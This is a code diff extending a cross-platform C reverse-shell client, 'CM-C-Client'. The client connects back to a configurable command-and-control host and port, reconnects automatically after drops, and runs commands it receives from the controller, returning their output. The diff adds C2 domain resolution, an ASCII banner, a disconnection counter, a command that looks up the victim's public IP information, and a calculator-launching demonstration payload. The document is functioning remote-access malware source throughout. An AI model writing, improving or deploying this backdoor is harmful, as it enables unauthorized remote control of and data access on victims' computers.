@@ -2,6 +2,14 @@
 #include <stdlib.h>
 #include <string.h>
 #include <errno.h>
+#include <libgen.h>
+#include <time.h>
+
+// 项目的头文件
+#include "version_info.h"
+#include "IP_info.h"
+
+
 
 #ifdef _WIN32
     #include <winsock2.h>
@@ -29,19 +37,21 @@
     #include <signal.h>
     #include <fcntl.h>
     #include <sys/select.h>
-    #ifndef MSG_NOSIGNAL
-	#define MSG_NOSIGNAL 0 // macOS 不支持这个标志，所以设为0
-    #endif
-    #ifdef __APPLE__
-	#ifndef SO_NOSIGPIPE
-	    #define SO_NOSIGPIPE 0x1022
-	#endif
-    #endif
+    #include <spawn.h>
+#ifndef MSG_NOSIGNAL
+    #define MSG_NOSIGNAL 0
 #endif
 
-// 你可以根据需要修改 C2 的 IP 和端口
-#ifndef C2_IP
-    #define C2_IP "127.0.0.1"
+#ifdef __APPLE__
+    #ifndef SO_NOSIGPIPE
+        #define SO_NOSIGPIPE 0x1022
+    #endif
+#endif
+#endif
+
+// 默认配置，可以根据需要修改 C2 的 IP/域名 和端口
+#ifndef C2_IP_DOMAIN
+    #define C2_IP_DOMAIN "127.0.0.1"
 #endif
 #ifndef C2_PORT
     #define C2_PORT 4444
@@ -130,10 +140,11 @@ void execute_no_timeout(int sock, char* raw_cmd) {
     CloseHandle(hChildStd_OUT_Rd);
 
 #else
-    // ================= Linux 平台：防死锁、防断连僵尸 =================
+    // ================= Linux/Macos/BSD 平台：防死锁、防断连僵尸 =================
     int pipefd[2];
     if (pipe(pipefd) < 0) return;
 
+    // 创建子进程
     pid_t pid = fork();
     if (pid < 0) { close(pipefd[0]); close(pipefd[1]); return; }
 
@@ -157,6 +168,7 @@ void execute_no_timeout(int sock, char* raw_cmd) {
     int flags = fcntl(pipefd[0], F_GETFL, 0);
     fcntl(pipefd[0], F_SETFL, flags | O_NONBLOCK);
 
+    // 监听最大描述符
     char buffer[BUF_SIZE];
     while (1) {
         fd_set read_fds;
@@ -164,10 +176,11 @@ void execute_no_timeout(int sock, char* raw_cmd) {
         tv.tv_sec = 0;
         tv.tv_usec = 100000; // 0.1 秒超时
         
-        FD_ZERO(&read_fds);
-        FD_SET(pipefd[0], &read_fds); // 监听管道回显
-        FD_SET(sock, &read_fds);       // 监听 Socket 死活
+        FD_ZERO(&read_fds);             // 清空读描述符集
+        FD_SET(pipefd[0], &read_fds);   // 监听管道回显
+        FD_SET(sock, &read_fds);        // 监听 Socket 死活
 
+        // 监听最大描述符
         int max_fd = (pipefd[0] > sock) ? pipefd[0] : sock;
         int select_res = select(max_fd + 1, &read_fds, NULL, NULL, &tv);
 
@@ -215,58 +228,283 @@ void execute_no_timeout(int sock, char* raw_cmd) {
 #endif
 }
 
+
+// 把 __DATE__ 转为 YYYY-MM-DD 格式
+const char *date_iso(void) {
+    static char buf[16];
+    const char *mon[] = {"Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"};
+    char m[4]; int d, y;
+    sscanf(BUILD_DATE, "%s %d %d", m, &d, &y);
+    int mm = 0;
+    for (int i=0; i<12; i++) if (!strcmp(m, mon[i])) { mm = i+1; break; }
+    sprintf(buf, "%04d-%02d-%02d", y, mm, d);
+    return buf;
+}
+
+// 上线后发送彩色Logo和当前程序信息和当前程序文件名到控制端
+int show_logo_info(int s, const char *prog_name) {
+
+#define RED     "\033[31m"
+#define GREEN   "\033[32m"
+#define YELLOW  "\033[33m"
+#define BLUE    "\033[34m"
+#define CYAN    "\033[36m"
+
+#define UNDERLINE "\033[4m" // 下划线
+#define BOLD    "\033[1m" // 粗体
+
+#define RESET   "\033[0m"
+
+    // 使用传入的程序名称参数
+    const char* Program_name = basename((char*)prog_name);
+
+    char logo_buf[1024];  // logo 足够大的缓冲区
+    char info_buf[512];  // info 足够大的缓冲区
+    char Program_name_buf[256] = {0};  // 程序名称缓冲区
+    
+    // 拼接彩色Logo字符串
+    sprintf(logo_buf,
+        "%s   _____    __  __               %s_____  %s\r\n"
+        "%s  / ____|  |  \\/  |             %s/ ____| %s\r\n"
+        "%s | |       | \\  / |   %s___%s___   %s| |      %s\r\n"
+        "%s | |       | |\\/| |  %s|___%s___|  %s| |      %s\r\n"
+        "%s | |____   | |  | |            %s| |____   %s\r\n"
+        "%s  \\_____|  |_|  |_|             %s\\_____|%s\r\n\n",
+        "\r\n"
+        RED, BLUE, RESET,
+        RED, BLUE, RESET,
+        GREEN, YELLOW, CYAN, BLUE, RESET,
+        GREEN, YELLOW, CYAN, BLUE, RESET,
+        BLUE, RED, RESET,
+        BLUE, RED, RESET
+    );
+
+    // 当前程序的版本号和构建日期和构建时间和项目URL和Issue URL
+        sprintf(info_buf,
+            "%sVersion: %s%s%s%s, %sBuild: %s%s%s %s%s\r\n",
+            // "%sProjectURL: %s%s%s\r\n"
+	        // "%sIssueURL: %s%s%s\r\n",
+
+        RED, BOLD, UNDERLINE, VERSION_STR, RESET, BLUE, BOLD, UNDERLINE, /*BUILD_DATE*/date_iso(), BUILD_TIME, RESET//,
+        // GREEN, BOLD, PROJECT_URL, RESET, YELLOW, BOLD, ISSUE_URL, RESET, RESET,
+    );
+
+    sprintf(Program_name_buf, "\tCM-C-Client:%s\r\n", Program_name);
+
+    // 发送完整Logo和当前程序信息和当前程序文件名
+    send(s, logo_buf, strlen(logo_buf), 0);
+    send(s, Program_name_buf, strlen(Program_name_buf), 0);
+    send(s, info_buf, strlen(info_buf), 0);
+
+    return 0;
+}
+
+int show_help_info(int s) {
+
+    char help_buf[1024];  //help足够大的缓冲区
+
+
+    sprintf(help_buf,
+        "CM-C-client function commands:\r\n"
+        "ip-info  -> get IP info in Public  network\r\n"
+        "cm-help  -> get help from CM-C\r\n"
+        );
+
+        // 发送帮助信息
+        send(s, help_buf, strlen(help_buf), 0);
+
+    return 0;
+}
+
+// 通过API根据受控端IP获取的信息
+int IP_INFO(int s)
+{
+    char ip_info_buf[1024] = {0};
+    // 整段清空缓冲区
+    memset(ip_info_buf, 0, sizeof(ip_info_buf));
+
+    get_online_info(ip_info_buf, sizeof(ip_info_buf)-2); // 预留\r\n位置
+    
+    // 安全拼接换行
+    strncat(ip_info_buf, "\r\n", sizeof(ip_info_buf) - strlen(ip_info_buf) - 1);
+
+    int len = strlen(ip_info_buf);
+    // 判断发送是否成功
+    if(send(s, ip_info_buf, len, 0) <= 0)
+    {
+        return -1; // 发送失败
+    }
+    return 0;
+}
+
+// 成功上线演示提示
+int Payload_Demonstrate(void) {
+#ifdef _WIN32
+    // Windows 实现：通过ShellExecute来打开默认计算器
+    // 先尝试启动 Windows 计算器应用（UWP），如果失败则回退到传统 calc.exe
+    HINSTANCE result = ShellExecute(NULL, NULL, "calculator://", NULL, NULL, SW_SHOWNORMAL);
+    if ((INT_PTR)result <= 32) {
+        // calculator:// 协议失败，回退到 calc.exe
+        ShellExecute(NULL, NULL, "calc.exe", NULL, NULL, SW_SHOWNORMAL);
+    }
+
+#elif defined(__APPLE__)
+    // macOS(Darwin) 实现：通过posix_spawn来打开 Calculator.app，避免弹出终端窗口
+    pid_t pid;
+    extern char **environ;
+    const char *argv[] = {"Calculator.app", NULL};
+    posix_spawn(&pid, "Calculator.app", NULL, NULL, argv, environ);
+
+#elif defined(__linux__) || defined(__FreeBSD__) || defined(__OpenBSD__) || defined(__NetBSD__)
+    // Linux/BSD 统一极简方案：不依赖 xdg、不依赖 URL、纯原生启动
+    pid_t pid;
+    extern char **environ;
+    int launched = 0;
+
+    // 全平台最常见 GUI 计算器（精简版，不重复）
+    const char *calcs[] = {
+        "gnome-calculator",
+        "kcalc",
+        "mate-calc",
+        "xfce4-calculator-plugin",
+        "galculator",
+        "lxqt-calculator",
+        "dtcalc",
+        "mate-calculator",
+        "xfce4-calculator",
+        "lxqt-calculator",
+        "qalculate-gtk",
+        "qalculate-qt",
+        "galculator",
+        "speedcrunch",
+        "xcalc",
+        NULL
+    };
+
+    // 循环尝试，成功一个就停
+    for (int i = 0; calcs[i] && !launched; i++) {
+        const char *app = calcs[i];
+        char *const argv[] = { (char*)app, NULL };
+
+        // posix_spawnp 自动搜索 PATH，不需要路径，不需要 access()
+        if (posix_spawnp(&pid, app, NULL, NULL, argv, environ) == 0) {
+            launched = 1;
+        }
+    }
+
+#else 
+
+#endif
+    return 0;
+}
+
 // --- 主程序入口 ---
-int main() {
+int main(int argc, char *argv[], char *envp[]) {
+    // 成功上线演示提示(可根据需要注释掉或取消注释)
+	// Payload_Demonstrate();
 #ifndef _WIN32
     signal(SIGINT, SIG_IGN);   
     signal(SIGPIPE, SIG_IGN);  
 #endif
 
+// 初始化Winsock
 #ifdef _WIN32
     WSADATA wsa; WSAStartup(MAKEWORD(2, 2), &wsa);
 #endif
 
     char buf[BUF_SIZE];
     char path[512];
+    // 记录初始化断连次数
+    static int drop_conn_count = 0;
 
     while (1) {
         int s;
-        struct sockaddr_in addr;
-        addr.sin_family = AF_INET;
-        addr.sin_port = htons(C2_PORT);
-        addr.sin_addr.s_addr = inet_addr(C2_IP);
+        struct addrinfo hints, *result;
+        memset(&hints, 0, sizeof(hints));
+        hints.ai_family = AF_INET;
+        hints.ai_socktype = SOCK_STREAM;
+        
+        char port_str[16];
+        snprintf(port_str, sizeof(port_str), "%d", C2_PORT);
+        
+        if (getaddrinfo(C2_IP_DOMAIN, port_str, &hints, &result) != 0) {
+            #ifdef _WIN32
+            Sleep(5000);
+            #else
+            sleep(5);
+            #endif
+            continue;
+        }
 
         while (1) {
-            s = (int)socket(AF_INET, SOCK_STREAM, 0);
-            if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) >= 0) {
-                break; 
+            s = (int)socket(result->ai_family, result->ai_socktype, result->ai_protocol);
+            if (connect(s, result->ai_addr, (int)result->ai_addrlen) >= 0) {
+                break;
             }
-#ifdef _WIN32
-            closesocket(s); Sleep(5000); 
-#else
+            #ifdef _WIN32
+            closesocket(s); Sleep(5000);
+            #else
             close(s); sleep(5);
-#endif
+            #endif
         }
         
-        send(s, "[*] 状态流模式已开启。已成功防断线，支持自动重连！\n", 48, 0);
+        freeaddrinfo(result);
+        
+        show_logo_info(s, argv[0]);
+	char tip_buf[128];
+	sprintf(tip_buf, "[*] Disconnection count: %d\r\n", drop_conn_count);
+	send(s, tip_buf, strlen(tip_buf), 0);
+        send(s, "[+] Connected successfully.\n", 27, 0);
 
         while (1) {
             getcwd(path, sizeof(path));
+
+            #ifdef _WIN32
+            // 获取当前程序的文件名和获取当前程序所在的文件目录
+            const char* Program_name = basename(__argv[0]);
+            const char* Program_dir = dirname(__argv[0]);
+            #else
+            const char* Program_name = basename(argv[0]);
+            const char* Program_dir = dirname(argv[0]);
+            #endif
+
+            // 获取当前的日期和时间
+            time_t now = time(NULL);
+            struct tm* tm = localtime(&now);
+            char date_time[32];
+            strftime(date_time, sizeof(date_time), "%Y-%m-%d %H:%M:%S", tm);
+
+            // 构建提示符
             char prompt[600];
-            snprintf(prompt, sizeof(prompt), "\n[%s] shell-> ", path);
+            snprintf(prompt, sizeof(prompt), "\n-{%s}-{(%s)[%s]}-> ", date_time, Program_name, path);
             
             if (send(s, prompt, (int)strlen(prompt), 0) < 0) {
                 break; 
             }
 
+            // 接收控制端的命令
             memset(buf, 0, BUF_SIZE);
             int len = (int)recv(s, buf, BUF_SIZE - 1, 0);
-            if (len <= 0) break; // 控制端掐断，立刻触发重连
+            if (len <= 0) {
+		    drop_conn_count++;
+		    break;
+	    }      // 控制端掐断，记录断连次数后立刻触发重连
             
             buf[strcspn(buf, "\r\n")] = 0;
             if (strlen(buf) == 0) continue;
+
+	    if (strcmp(buf, "ip-info") == 0) {
+                IP_INFO(s);
+                continue;  // * 务必加上 continue，防止命令被当作系统命令再次执行
+            }
+
+        if (strcmp(buf, "cm-help") == 0) {
+            show_help_info(s);
+            continue;
+        }
             
-            if (strcmp(buf, "exit") == 0) {
+            if (strcmp(buf, "exit") == 0 || strcmp(buf, "quit") == 0) {
+                send(s, "[-] Logout.\r\n", 12, 0);
 #ifdef _WIN32
                 closesocket(s); WSACleanup();
 #else
@@ -275,6 +513,7 @@ int main() {
                 return 0;
             }
 
+            // 处理cd命令
             if (strncmp(buf, "cd ", 3) == 0) {
                 chdir(buf + 3);
                 continue;
@@ -283,6 +522,7 @@ int main() {
             execute_no_timeout(s, buf);
         }
 
+// 关闭连接
 #ifdef _WIN32
         closesocket(s); Sleep(2000);  
 #else
@@ -290,6 +530,7 @@ int main() {
 #endif
     }  
 
+// 清理Winsock
 #ifdef _WIN32
     WSACleanup();
 #endif
